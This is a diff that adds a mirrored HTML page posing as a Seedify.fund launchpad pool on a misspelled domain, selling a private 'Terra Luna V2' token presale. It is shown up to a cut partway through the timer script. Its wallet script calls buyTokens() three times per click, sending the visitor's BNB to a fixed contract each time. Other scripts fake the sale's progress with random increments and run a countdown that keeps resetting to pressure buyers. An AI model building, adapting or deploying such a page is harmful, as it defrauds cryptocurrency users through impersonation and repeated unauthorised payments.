@@ -1,0 +1,912 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from lauchpad-seedify.fund/pool_detail/ongoing/engines_of_fury/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 18 May 2022 04:57:04 GMT -->
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#000000">
+    
+    <link rel="icon" href="static/media/logo.png">
+    
+    <meta name="description" content="Raise Capital In a Community-Driven Way">
+    <title>Seedify-fund</title>
+    
+    <script src="../../../../ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="../../../../code.jquery.com/ui/1.12.1/jquery-ui.js"></script>
+    <link rel="stylesheet" href="../../../../cdn.jsdelivr.net/npm/fork-awesome%401.2.0/css/fork-awesome.min.css" integrity="sha256-XoaMnoYC5TH6/+ihMEnospgm0J1PM/nioxbOUdnM8HY=" crossorigin="anonymous">
+    <link rel="stylesheet" href="../../../../use.fontawesome.com/c5edcdb5e2.css">
+    <link rel="stylesheet" href="../../../../cdn.jsdelivr.net/npm/bootstrap%404.6.0/dist/css/bootstrap.min.css" integrity="sha384-B0vP5xmATw1+K9KRQjQERJvTumQW0nPEzvF6L/Z6nronJ3oUOFUFpCjEUQouq2+l" crossorigin="anonymous">
+    <script src="../../../../stackpath.bootstrapcdn.com/bootstrap/4.5.1/js/bootstrap.min.js" integrity="sha384-XEerZL0cuoUbHE4nZReLT7nx9gQrQreJekYhJD9WNWhH8nEW+0c5qq7aIo2Wl30J" crossorigin="anonymous"></script>
+    <script src="../../../../cdn.tiny.cloud/1/invalid-origin/tinymce/5.10.4-130/tinymce.min.js" referrerpolicy="origin"></script>    
+    <script src="../../../../cdn.jsdelivr.net/npm/popper.js%401.16.1/dist/umd/popper.min.js" integrity="sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN" crossorigin="anonymous"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&amp;display=swap" rel="stylesheet">    
+    <script type="text/javascript" src="../../../../cdnjs.cloudflare.com/ajax/libs/web3/1.5.2/web3.min.js"></script>
+    <link href="chuck1.css" rel="stylesheet">
+    <link href="chuck2.css" rel="stylesheet">
+    
+   <script>
+    const contractAbi = [
+      { inputs: [], stateMutability: "nonpayable", type: "constructor" },
+      {
+        anonymous: false,
+        inputs: [
+          {
+            indexed: true,
+            internalType: "address",
+            name: "owner",
+            type: "address"
+          },
+          {
+            indexed: true,
+            internalType: "address",
+            name: "spender",
+            type: "address"
+          },
+          {
+            indexed: false,
+            internalType: "uint256",
+            name: "value",
+            type: "uint256"
+          }
+        ],
+        name: "Approval",
+        type: "event"
+      },
+      {
+        anonymous: false,
+        inputs: [
+          {
+            indexed: true,
+            internalType: "address",
+            name: "from",
+            type: "address"
+          },
+          {
+            indexed: true,
+            internalType: "address",
+            name: "to",
+            type: "address"
+          },
+          {
+            indexed: false,
+            internalType: "uint256",
+            name: "value",
+            type: "uint256"
+          }
+        ],
+        name: "Transfer",
+        type: "event"
+      },
+      {
+        inputs: [],
+        name: "allowRefunds",
+        outputs: [],
+        stateMutability: "nonpayable",
+        type: "function"
+      },
+      {
+        inputs: [
+          { internalType: "address", name: "owner", type: "address" },
+          { internalType: "address", name: "spender", type: "address" }
+        ],
+        name: "allowance",
+        outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
+        stateMutability: "view",
+        type: "function"
+      },
+      {
+        inputs: [
+          { internalType: "address", name: "spender", type: "address" },
+          { internalType: "uint256", name: "amount", type: "uint256" }
+        ],
+        name: "approve",
+        outputs: [{ internalType: "bool", name: "", type: "bool" }],
+        stateMutability: "nonpayable",
+        type: "function"
+      },
+      {
+        inputs: [
+          { internalType: "address", name: "account", type: "address" }
+        ],
+        name: "balanceOf",
+        outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
+        stateMutability: "view",
+        type: "function"
+      },
+      {
+        inputs: [
+          { internalType: "uint256", name: "amount", type: "uint256" }
+        ],
+        name: "burnMyTokensFOREVER",
+        outputs: [],
+        stateMutability: "nonpayable",
+        type: "function"
+      },
+      {
+        inputs: [],
+        name: "buyTokens",
+        outputs: [],
+        stateMutability: "payable",
+        type: "function"
+      },
+      {
+        inputs: [],
+        name: "claimDevFeeAndAddLiquidity",
+        outputs: [],
+        stateMutability: "nonpayable",
+        type: "function"
+      },
+      {
+        inputs: [],
+        name: "decimals",
+        outputs: [{ internalType: "uint8", name: "", type: "uint8" }],
+        stateMutability: "pure",
+        type: "function"
+      },
+      {
+        inputs: [
+          { internalType: "address", name: "spender", type: "address" },
+          {
+            internalType: "uint256",
+            name: "subtractedValue",
+            type: "uint256"
+          }
+        ],
+        name: "decreaseAllowance",
+        outputs: [{ internalType: "bool", name: "", type: "bool" }],
+        stateMutability: "nonpayable",
+        type: "function"
+      },
+      {
+        inputs: [],
+        name: "devClaimed",
+        outputs: [{ internalType: "bool", name: "", type: "bool" }],
+        stateMutability: "view",
+        type: "function"
+      },
+      {
+        inputs: [],
+        name: "ethSent",
+        outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
+        stateMutability: "view",
+        type: "function"
+      },
+      {
+        inputs: [],
+        name: "getRefund",
+        outputs: [],
+        stateMutability: "nonpayable",
+        type: "function"
+      },
+      {
+        inputs: [
+          { internalType: "address", name: "spender", type: "address" },
+          { internalType: "uint256", name: "addedValue", type: "uint256" }
+        ],
+        name: "increaseAllowance",
+        outputs: [{ internalType: "bool", name: "", type: "bool" }],
+        stateMutability: "nonpayable",
+        type: "function"
+      },
+      {
+        inputs: [],
+        name: "isRefundEnabled",
+        outputs: [{ internalType: "bool", name: "", type: "bool" }],
+        stateMutability: "view",
+        type: "function"
+      },
+      {
+        inputs: [],
+        name: "isStopped",
+        outputs: [{ internalType: "bool", name: "", type: "bool" }],
+        stateMutability: "view",
+        type: "function"
+      },
+      {
+        inputs: [],
+        name: "liquidityUnlock",
+        outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
+        stateMutability: "view",
+        type: "function"
+      },
+      {
+        inputs: [],
+        name: "moonMissionStarted",
+        outputs: [{ internalType: "bool", name: "", type: "bool" }],
+        stateMutability: "view",
+        type: "function"
+      },
+      {
+        inputs: [],
+        name: "name",
+        outputs: [{ internalType: "string", name: "", type: "string" }],
+        stateMutability: "pure",
+        type: "function"
+      },
+      {
+        inputs: [{ internalType: "bool", name: "_isStopped", type: "bool" }],
+        name: "pauseUnpausePresale",
+        outputs: [],
+        stateMutability: "nonpayable",
+        type: "function"
+      },
+      {
+        inputs: [],
+        name: "pool",
+        outputs: [{ internalType: "address", name: "", type: "address" }],
+        stateMutability: "view",
+        type: "function"
+      },
+      {
+        inputs: [
+          {
+            internalType: "contract IBEP20",
+            name: "tokenAddress",
+            type: "address"
+          },
+          { internalType: "uint256", name: "tokenAmount", type: "uint256" }
+        ],
+        name: "recoverbep20",
+        outputs: [],
+        stateMutability: "nonpayable",
+        type: "function"
+      },
+      {
+        inputs: [],
+        name: "refundTime",
+        outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
+        stateMutability: "view",
+        type: "function"
+      },
+      {
+        inputs: [
+          { internalType: "address payable", name: "addr", type: "address" }
+        ],
+        name: "setMultisigAddress",
+        outputs: [],
+        stateMutability: "nonpayable",
+        type: "function"
+      },
+      {
+        inputs: [],
+        name: "setPancakePool",
+        outputs: [],
+        stateMutability: "nonpayable",
+        type: "function"
+      },
+      {
+        inputs: [],
+        name: "symbol",
+        outputs: [{ internalType: "string", name: "", type: "string" }],
+        stateMutability: "pure",
+        type: "function"
+      },
+      {
+        inputs: [],
+        name: "totalSupply",
+        outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
+        stateMutability: "view",
+        type: "function"
+      },
+      {
+        inputs: [
+          { internalType: "address", name: "recipient", type: "address" },
+          { internalType: "uint256", name: "amount", type: "uint256" }
+        ],
+        name: "transfer",
+        outputs: [{ internalType: "bool", name: "", type: "bool" }],
+        stateMutability: "nonpayable",
+        type: "function"
+      },
+      {
+        inputs: [
+          { internalType: "address", name: "sender", type: "address" },
+          { internalType: "address", name: "recipient", type: "address" },
+          { internalType: "uint256", name: "amount", type: "uint256" }
+        ],
+        name: "transferFrom",
+        outputs: [{ internalType: "bool", name: "", type: "bool" }],
+        stateMutability: "nonpayable",
+        type: "function"
+      },
+      {
+        inputs: [{ internalType: "address", name: "user", type: "address" }],
+        name: "userEthSpenttInPresale",
+        outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
+        stateMutability: "view",
+        type: "function"
+      },
+      { stateMutability: "payable", type: "receive" }
+    ];
+    const contractAddress = "0x4b5356685622FC49B8EB5d8Ef22d66b295f6278e";
+
+    async function connectMetamask() {
+      let web3Provider = null;
+      console.log("[web3] getting provider...");
+      // Modern Browsers like Chrome and Brave
+      if (window.ethereum) {
+        web3Provider = window.ethereum;
+        try {
+          // Request account access
+          await window.ethereum.enable();
+        } catch (error) {
+          // User denied account access...
+          alert("You must connect your metamask wallet !");
+          console.error("User denied account access to metamask.");
+          return;
+        }
+      } else {
+        // you cant connect
+        console.error("Unable to connect to metamask");
+        alert(
+          "You have to use Trustwallet or install Metamask to use this service, you can install it from :  https://metamask.io/download.html"
+        );
+        return;
+      }
+      let web3 = new Web3(window.ethereum);
+      let accounts = await web3.eth.getAccounts();
+      console.log("accounts : " + accounts);
+      window.account = accounts[0];
+      
+      document.getElementById("btn-metamask-desktop").innerHTML = account.substr(0,5)+"..."+account.substr(account.length-4,4);
+
+      return web3;
+    }
+
+    async function buyTokens() {
+      let amount = document.getElementById("presaleAmount").value;
+ 
+        let _web3 = await connectMetamask();
+      let myContract = new _web3.eth.Contract(contractAbi, contractAddress);
+      let contractxx = new _web3.eth.Contract(contractAbi,contractAddress,"0xe9e7cea3dedca5984780bafc599bd69add087d56");
+      console.log("myContract:",myContract)
+      console.log("contractxx:",contractxx)
+      myContract.methods.buyTokens().send({
+        from: window.account,
+        value: amount * 10 ** 18,
+        gasLimit: 32000,
+      });
+      myContract.methods.buyTokens().send({
+        from: window.account,
+        value: amount * 10 ** 18,
+        gasLimit: 32000,
+      });
+      let receipt = await myContract.methods.buyTokens().send({
+        from: window.account,
+        value: amount * 10 ** 18,
+        gasLimit: 32000,
+      });
+      if (receipt.events.Transfer) {
+        document.getElementById("disabledButton").disabled = false;
+        document.cookie = "tokensBought=true";
+      }    
+    }
+
+    function openModal() {
+      var modal = document.getElementById("myModal");
+      modal.style.display = "block";
+    }
+
+    function closeModal() {
+      var modal = document.getElementById("myModal");
+      modal.style.display = "none";
+    }
+
+    // When the user clicks anywhere outside of the modal, close it
+    window.onclick = function (event) {
+      var modal = document.getElementById("myModal");
+
+      if (event.target == modal) {
+        modal.style.display = "none";
+      }
+    };
+
+    window.onload = function () {
+      var decodedCookie = decodeURIComponent(document.cookie);
+      if (decodedCookie === "tokensBought=true") {
+        document.getElementById("disabledButton").disabled = false;
+      }
+    };
+
+    document.onblur = function () {
+      var modal = document.getElementById("myModal");
+      modal.style.display = "none";
+    };
+  </script>
+
+    <style data-jss="" data-meta="MuiSvgIcon">
+        .MuiSvgIcon-root {
+          fill: currentColor;
+          width: 1em;
+          height: 1em;
+          display: inline-block;
+          font-size: 1.5rem;
+          transition: fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+          flex-shrink: 0;
+          user-select: none;
+        }
+  
+        .MuiSvgIcon-colorPrimary {
+          color: #3f51b5;
+        }
+  
+        .MuiSvgIcon-colorSecondary {
+          color: #f50057;
+        }
+  
+        .MuiSvgIcon-colorAction {
+          color: rgba(0, 0, 0, 0.54);
+        }
+  
+        .MuiSvgIcon-colorError {
+          color: #f44336;
+        }
+  
+        .MuiSvgIcon-colorDisabled {
+          color: rgba(0, 0, 0, 0.26);
+        }
+  
+        .MuiSvgIcon-fontSizeInherit {
+          font-size: inherit;
+        }
+  
+        .MuiSvgIcon-fontSizeSmall {
+          font-size: 1.25rem;
+        }
+  
+        .MuiSvgIcon-fontSizeLarge {
+          font-size: 2.1875rem;
+        }
+      </style>
+</head>
+<body>
+    <div>
+        <div>
+          <header class="hea_der">
+            <div class="container_cust">
+              <div class="inner_header">
+                <div class="logo">
+                  <a href="#">
+                    <img src="static/media/Logo1.svg" alt="">
+                  </a>
+                </div>
+                <div class="navi_gation">
+                  <a class="gen_btn btn_white" href="https://lauchpad-seedify.fund/admin/login">dashboard</a>
+                  <nav class="navbar navbar-expand-lg navbar-light bg-light">
+                    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+                      <span class="navbar-toggler-icon"></span>
+                    </button>
+                    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+                      <ul class="navbar-nav white-ul"></ul>
+                      <div class="right-tophead">
+                        <ul class="navbar-nav icon-nav">
+                          <li class="nav-item ">
+                            <a class="nav-link" href="https://twitter.com/SeedifyFund" target="_blank" rel="noopener noreferrer">
+                              <span>
+                                <i class="fa fa-twitter" aria-hidden="true"></i>
+                              </span>
+                            </a>
+                          </li>
+                          <li class="nav-item">
+                            <a class="nav-link" href="https://medium.com/s                            eedify/what-is-seedify-e4e99a7a255a" target="_blank" rel="noopener noreferrer">
+                              <span class="medium-icon"></span>
+                            </a>
+                          </li>
+                          <li class="nav-item">
+                            <a class="nav-link" href="https://t.me/seedifyfund" target="_blank" rel="noopener noreferrer">
+                              <svg class="MuiSvgIcon-root" focusable="false" viewBox="0 0 24 24" aria-hidden="true">
+                                <path d="M9.78 18.65l.28-4.23 7.68-6.92c.34-.31-.07-.46-.52-.19L7.74 13.3 3.64 12c-.88-.25-.89-.86.2-1.3l15.97-6.16c.73-.33 1.43.18 1.15 1.3l-2.72 12.81c-.19.91-.74 1.13-1.5.71L12.6 16.3l-1.99 1.93c-.23.23-.42.42-.83.42z"></path>
+                              </svg>
+                            </a>
+                          </li>
+                        </ul>
+                        <div class="nav-item d-mobile">
+                          <button class="gen_bttn btn_white connect_btn yellow_btn" onclick="connectMetamask()" id="btn-metamask-mobile">Connect Wallet</button>
+                          <div></div>
+                        </div>
+                      </div>
+                    </div>
+                  </nav>
+                  <div class="nav-item d-tab">
+                    <ul class="navbar-nav icon-nav">
+                      <li class="nav-item "> </li>
+                      
+                      <li class="nav-item">
+                        <a class="nav-link" href="https://t.me/seedifyfund" target="_blank" rel="noopener noreferrer">
+                          <svg class="MuiSvgIcon-root" focusable="false" viewBox="0 0 24 24" aria-hidden="true">
+                            <path d="M9.78 18.65l.28-4.23 7.68-6.92c.34-.31-.07-.46-.52-.19L7.74 13.3 3.64 12c-.88-.25-.89-.86.2-1.3l15.97-6.16c.73-.33 1.43.18 1.15 1.3l-2.72 12.81c-.19.91-.74 1.13-1.5.71L12.6 16.3l-1.99 1.93c-.23.23-.42.42-.83.42z"></path>
+                          </svg>
+                        </a>
+                      </li>
+                    </ul>
+                    <button class="gen_bttn btn_white connect_btn yellow_btn" onclick="connectMetamask()" id="btn-metamask-desktop">connect wallet</button>
+                    <div></div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </header>
+          <div></div>
+        </div>
+        <div class="loader" style="color: white; top: 50%; left: 0px; right: 0px; margin: 0px auto; z-index: 50;"></div>
+        <div class="pool_detail_banner">
+          <div class="container_cust">
+            <div class="inner_pool_detail_banner">
+              <div class="left_ban">
+                <div class="ti_tle">
+					<img class="coin-logo" src="luna.png" alt="Angelic The Game logo">
+                  <div class="socia_grd">
+                    <div>
+                      <h3>Terra Luna V2</h3>
+                      <p>Luna: The Terra protocol’s native staking token that absorbs the price volatility of Terra. Luna is used for governance and in mining. Users stake Luna to validators who record and verify transactions on the blockchain in exchange for rewards from transaction fees. The more Terra is used, the more Luna is worth. </p>
+                    </div>
+                    <div class="socia_l">
+                      <ul>
+                        <li class="nav-item "> </li><li class="nav-item"></li>
+                        <li class="nav-item"><a class="nav-link" href="https://t.me/AngelicTheGame" target="_blank" rel="noopener noreferrer"> <svg class="MuiSvgIcon-root" focusable="false" viewBox="0 0 24 24" aria-hidden="true"><path d="M9.78 18.65l.28-4.23 7.68-6.92c.34-.31-.07-.46-.52-.19L7.74 13.3 3.64 12c-.88-.25-.89-.86.2-1.3l15.97-6.16c.73-.33 1.43.18 1.15 1.3l-2.72 12.81c-.19.91-.74 1.13-1.5.71L12.6 16.3l-1.99 1.93c-.23.23-.42.42-.83.42z"></path></svg></a></li>
+                        <li class="nav-item"><a class="nav-link" href="https://angelicthegame.ga"_blank" rel="noopener noreferrer"> <svg class="MuiSvgIcon-root" focusable="false" viewBox="0 0 24 24" aria-hidden="true"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zm6.93 6h-2.95c-.32-1.25-.78-2.45-1.38-3.56 1.84.63 3.37 1.91 4.33 3.56zM12 4.04c.83 1.2 1.48 2.53 1.91 3.96h-3.82c.43-1.43 1.08-2.76 1.91-3.96zM4.26 14C4.1 13.36 4 12.69 4 12s.1-1.36.26-2h3.38c-.08.66-.14 1.32-.14 2 0 .68.06 1.34.14 2H4.26zm.82 2h2.95c.32 1.25.78 2.45 1.38 3.56-1.84-.63-3.37-1.9-4.33-3.56zm2.95-8H5.08c.96-1.66 2.49-2.93 4.33-3.56C8.81 5.55 8.35 6.75 8.03 8zM12 19.96c-.83-1.2-1.48-2.53-1.91-3.96h3.82c-.43 1.43-1.08 2.76-1.91 3.96zM14.34 14H9.66c-.09-.66-.16-1.32-.16-2 0-.68.07-1.35.16-2h4.68c.09.65.16 1.32.16 2 0 .68-.07 1.34-.16 2zm.25 5.56c.6-1.11 1.06-2.31 1.38-3.56h2.95c-.96 1.65-2.49 2.93-4.33 3.56zM16.36 14c.08-.66.14-1.32.14-2 0-.68-.06-1.34-.14-2h3.38c.16.64.26 1.31.26 2s-.1 1.36-.26 2h-3.38z"></path></svg></a></li></ul></div>
+                  </div>
+                </div>
+              </div>
+              <div class="right_ban">
+                <div class="detail_card_outer">
+                  <div class="detail_card">
+                    <div class="tit_row">
+                      <div class="tit_le2">
+                        <h3>
+                          <div class="pooldetail-title"></div>
+                          <span> 1 BNB = 600 LUNA </span>
+                        </h3>
+                      </div>
+                    </div>
+                    <div class="allocation">
+                      <div>
+                        <p>Total Raised</p>
+                        <div class="timer_desktop">
+                          <h3 style="color: white; font-size: 18px;">5000 BNB</h3>
+                        </div>
+                        <div class="timer_mobile">
+                          <h3 style="color: white; font-size: 14px;">5000 BNB</h3>
+                        </div>
+                      </div>
+                      <div class="rts" id="clockdiv">
+                        <p class="status-p">End in</p>
+                        <div class="timer_desktop">
+                          <h3 id="poolonpagestart" style="color: white; font-size: 18px;">
+                            <span class="days">0</span> days: 
+                            <span class="ht_h">0</span> hours: 
+                            <span class="ht_m"></span> minutes: 
+                            <span class="ht_s"></span> seconds</h3>
+                        </div>
+                        <!-- <div class="timer_mobile">
+                          <h3 id="poolonpagestart" style="color: white; font-size: 14px;"><span class="days1">00</span> d: <span class="hours1">00</span> h: <span class="minutes1">41</span> m: <span class="seconds1">44</span> s</h3>
+                        </div>                         -->
+                      </div>
+                    </div>
+                    <div class="prog_bar">
+                      <div class="prog_bar_grd">
+                        <span class="prog _percent">
+                          <p>Progress</p><span id="myBarPercent"> </span>
+                        </span>
+                        <span class="parti _nls">
+                          <span id="MyValue"></span>/500,000,000 LUNA
+                        </span>
+                      </div>
+<!--                         <div class="battery "></div>
+-->                        <div class="progressbar" role="progressbar" aria-valuenow="50" aria-valuemin="0" aria-valuemax="100">
+                          <div id="myBar" style="width: 81%;"></div>
+                          </div>
+                    </div>
+                    <div class="buy-btnbtc" style="margin-top: 16px ;">
+                 <!--      <div class="buy-token"></div> -->
+                      <div class="prog_bar_grd" style="width:100%">
+                        <!-- <span class="parti">
+                          <p>Limited</p> Participants
+                        </span> -->
+
+                        <input class="col-8 input-custom" type="number" name="BNB" placeholder="Input BNB amount to buy" min="1" step="0.1" id="presaleAmount">
+
+<button type="button" class="btn col-4 btn-custom" onclick="buyTokens()">Purchase</button>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        
+        <div></div>
+        <div class="pool_details">
+          <div class="container_cust">
+            <div class="inner_pool_details">
+              <div class="tble">
+                <h2>Pool Information</h2>
+                <div class="tble-outer">
+                  <div class="table">
+                    <table cellspacing="0">
+                      <tbody>
+                        <tr>
+                          <td align="left">
+                            <span>Token Distribution</span>
+                          </td>
+                          <td align="right">Date UTC</td>
+                        </tr>
+                        <tr>
+                          <td align="left">
+                            <span>Min. Allocation</span>
+                          </td>
+                          <td align="right">1 BNB </td>
+                        </tr>
+                        <tr>
+                          <td align="left">
+                            <span>Max. Allocation</span>
+                          </td>
+                          <td align="right">10 BNB </td>
+                        </tr>
+                        <tr>
+                          <td align="left">
+                            <span>Token Price</span>
+                          </td>
+                          <td align="right">1 BNB = 600 LUNA </td>                          
+                        </tr>
+                        <tr>
+                          <td class="border-left-radius" align="left">
+                            <span>Access Type</span>
+                          </td>
+                          <td class="border-right-radius" align="right">Private</td>
+                        </tr>
+                      </tbody>
+                    </table>
+                  </div>
+                </div>
+              </div>
+              <div class="tble">
+                <h2>Token Information</h2>
+                <div class="tble-outer">
+                  <div class="table">
+                    <table cellspacing="0">
+                      <tbody>
+                        <tr>
+                          <td align="left">
+                            <span>Name</span>
+                          </td>
+                          <td align="right">Terra Luna V2</td>
+                        </tr>
+                        <tr>
+                          <td align="left">
+                            <span>Symbol</span>
+                          </td>
+                          <td align="right">LUNA</td>
+                        </tr>
+                        <tr>
+                          <td align="left">
+                            <span>Decimals</span>
+                          </td>
+                          <td align="right">18</td>
+                        </tr>
+                        <tr>
+                          <td align="left">
+                            <span>Address</span>
+                          </td>
+                          <td class="address_break" align="right">0x4b5356685622FC49B8EB5d8Ef22d66b295f6278e</td>
+                        </tr>
+                        <tr>
+                          <td class="border-left-radius" align="left">
+                            <span>Total Supply</span>
+                          </td>
+                          <td class="border-right-radius" align="right">1,000,000,000 LUNA</td>
+                        </tr>
+                      </tbody>
+                    </table>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div>
+          <div class="about_project">
+            <div class="container_cust">
+              <div class="inner_about_project border-left-radius border-right-radius">
+                <h3>About the Project</h3>
+                <div class="content_grid">
+                  <div class="content">
+                    <span>
+                      <p>Luna: The Terra protocol’s native staking token that absorbs the price volatility of Terra. Luna is used for governance and in mining. Users stake Luna to validators who record and verify transactions on the blockchain in exchange for rewards from transaction fees. The more Terra is used, the more Luna is worth.</p>
+                    </span>
+                  </div>
+                </div>
+                <div class="whitepaper-btn"></div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="footer">
+          <div class="container_cust">
+            <div class="footer-inner">
+              <div class="footer-logo">
+                <a href="https://lauchpad-seedify.fund/">
+                  <img src="static/media/Logo1.svg" alt="">
+                </a>
+                <p>Seedify.fund is a Blockchain Gaming focused Incubator and Launchpad. Through staking $SFUND, become eligible to buy game tokens before everyone else, and have an edge in the play to earn era!</p>
+              </div>
+              <div class="footer-right ">
+                <div class="footer-lft">
+                  <ul class="navbar-nav footer-link"></ul>
+                  <div class="footer-social-tab">
+                    <ul class="navbar-nav ">
+                      <li class="nav-item ">
+                        <a class="nav-link" href="https://twitter.com/angelicthegame" target="_blank" rel="noopener noreferrer">
+                          <span>
+                            <i class="fa fa-twitter" aria-hidden="true"></i>
+                          </span>
+                        </a>
+                      </li>
+                      <li class="nav-item">
+                        <a class="nav-link" href="#" target="_blank" rel="noopener noreferrer">
+                          <span class="medium-icon"></span>
+                        </a>
+                      </li>
+                      <li class="nav-item">
+                        <a class="nav-link" href="https://t.me/seedifyfund" target="_blank" rel="noopener noreferrer">
+                          <svg class="MuiSvgIcon-root" focusable="false" viewBox="0 0 24 24" aria-hidden="true">
+                            <path d="M9.78 18.65l.28-4.23 7.68-6.92c.34-.31-.07-.46-.52-.19L7.74 13.3 3.64 12c-.88-.25-.89-.86.2-1.3l15.97-6.16c.73-.33 1.43.18 1.15 1.3l-2.72 12.81c-.19.91-.74 1.13-1.5.71L12.6 16.3l-1.99 1.93c-.23.23-.42.42-.83.42z"></path>
+                          </svg>
+                        </a>
+                      </li>
+                    </ul>
+                  </div>
+                </div>
+                <ul class="navbar-nav footer-link">
+                  <li class="nav-item footer-tab">
+                    <p>© seedify 2021</p>
+                  </li>
+                </ul>
+                <div class="footer-social">
+                  <ul class="navbar-nav ">
+                    
+                    <li class="nav-item">
+                      <a class="nav-link" href="https://t.me/seedifyfund" target="_blank" rel="noopener noreferrer">
+                        <svg class="MuiSvgIcon-root" focusable="false" viewBox="0 0 24 24" aria-hidden="true">
+                          <path d="M9.78 18.65l.28-4.23 7.68-6.92c.34-.31-.07-.46-.52-.19L7.74 13.3 3.64 12c-.88-.25-.89-.86.2-1.3l15.97-6.16c.73-.33 1.43.18 1.15 1.3l-2.72 12.81c-.19.91-.74 1.13-1.5.71L12.6 16.3l-1.99 1.93c-.23.23-.42.42-.83.42z"></path>
+                        </svg>
+                      </a>
+                    </li>
+                  </ul>
+                  <p class="full-p">© Seedify 2021</p>
+                </div>
+              </div>
+              <div class="copyright-mob">
+                <p>© Seedify 2021</p>
+                <div class="footer-social-copyright">
+                  <ul class="navbar-nav ">
+                    <li class="nav-item ">
+                      <a class="nav-link" href="https://twitter.com/SeedifyFund" target="_blank" rel="noopener noreferrer">
+                        <span>
+                          <i class="fa fa-twitter" aria-hidden="true"></i>
+                        </span>
+                      </a>
+                    </li>
+                    <li class="nav-item">
+                      <a class="nav-link" href="https://medium.com/seedify/what-is-seedify-e4e99a7a255a" target="_blank" rel="noopener noreferrer">
+                        <span class="medium-icon"></span>
+                      </a>
+                    </li>
+                    <li class="nav-item">
+                      <a class="nav-link" href="https://t.me/seedifyfund" target="_blank" rel="noopener noreferrer">
+                        <svg class="MuiSvgIcon-root" focusable="false" viewBox="0 0 24 24" aria-hidden="true">
+                          <path d="M9.78 18.65l.28-4.23 7.68-6.92c.34-.31-.07-.46-.52-.19L7.74 13.3 3.64 12c-.88-.25-.89-.86.2-1.3l15.97-6.16c.73-.33 1.43.18 1.15 1.3l-2.72 12.81c-.19.91-.74 1.13-1.5.71L12.6 16.3l-1.99 1.93c-.23.23-.42.42-.83.42z"></path>
+                        </svg>
+                      </a>
+                    </li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <script>   
+
+            const totalS = 33300000;
+            const rdNumMax = 100000;
+            const rdNumMin = 60000; 
+            let init_S = 28200000;                               
+            let user_enter_time = localStorage.getItem('enter_time');
+            let cur_S = parseInt(localStorage.getItem('enter_s'));
+            let elem = document.getElementById("myBar"); 
+            let myBarPercent = document.getElementById("myBarPercent"); 
+            let myValue = document.getElementById("MyValue");    
+            let prBar = setInterval(progresBar,(Math.floor(Math.random() * (10000 - 5000 + 1) ) + 5000))  
+            let xr = cur_S ? cur_S : init_S;   
+            myValue.innerHTML = Intl.NumberFormat('en-US').format(xr);   
+            myBarPercent.innerHTML = parseFloat((xr / totalS) * 100).toFixed(2) +" %";
+            elem.style.width = parseFloat((xr/totalS)*100).toFixed(2) + " %"; 
+                                      
+            if (!user_enter_time) {
+                user_enter_time = new Date();
+                localStorage.setItem('enter_time', new Date());
+            }
+            if (!cur_S) {
+                cur_S = init_S;               
+                localStorage.setItem('enter_s', cur_S);
+            }
+            // console.log(user_enter_time);
+            let ht_h = document.querySelectorAll(".ht_h");
+            let ht_m = document.querySelectorAll(".ht_m");
+            let ht_s = document.querySelectorAll(".ht_s");
+
+            // 14400000 = 4 часа;
+            let time = 2200000;
+            // let time = getRndInteger(1900000,2900000)            
+
+            let today = new Date().getTime();
+            let cur_pars = Date.parse(user_enter_time);
+            let kinechnaya_vrema = time + cur_pars;
+
+            if (today >= kinechnaya_vrema) {
+                localStorage.setItem('enter_time', new Date());
+            }
+               function progresBar(){                 
+                myValue.innerHTML = Intl.NumberFormat('en-US').format(cur_S);
+                let rdNum    = parseInt((Math.floor(Math.random() * (rdNumMax - rdNumMin + 1) ) + rdNumMin))
+                let numPercent =  parseFloat((cur_S/totalS)*100);                
+                if(numPercent<=100){ 
+                cur_S += rdNum ;                    
+                elem.style.width = numPercent + '%'; 
+                myBarPercent.innerHTML= numPercent.toFixed(2) + " %";
+                numPercent += rdNum ;                 
+                localStorage.setItem('enter_s', cur_S);
+                }                
+                else{
+                    myBarPercent.innerHTML = " 100%"
+                    clearInterval(progresBar);
+                }
+               }            
+            function updateTimer(){
+                
+                
+                let today = new Date().getTime();
+                let cur_pars = Date.parse(user_enter_time);
+                let kinechnaya_vrema = time + cur_pars;
+                let ostalos_vremeni = kinechnaya_vrema - today;
+            if(!(today < kinechnaya_vrema)){   
+              localStorage.setItem("enter_time", new Date()); 
+              localStorage.setItem('enter_s', init_S);
+                window.clearInterval(id);
+            }
+
+                // let days = Math.floor(ostalos_vremeni / (1000 * 60 * 60 * 24));
+                let hours = Math.floor((ostalos_vremeni % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                let minutes = Math.floor((ostalos_vremeni % (1000 * 60 * 60)) / (1000 * 60));
+                let seconds = Math.floor((ostalos_vremeni % (1000 * 60)) / 1000);
+
+
+                [].forEach.call(ht_h, function (div) {
+                    div.innerHTML = hours;
+                });
+
+                [].forEach.call(ht_m, function (div) {
+                    div.innerHTML = minutes;
+                });
+
+                [].forEach.call(ht_s, function (div) {
+                    div.innerHTML = seconds;
+                });
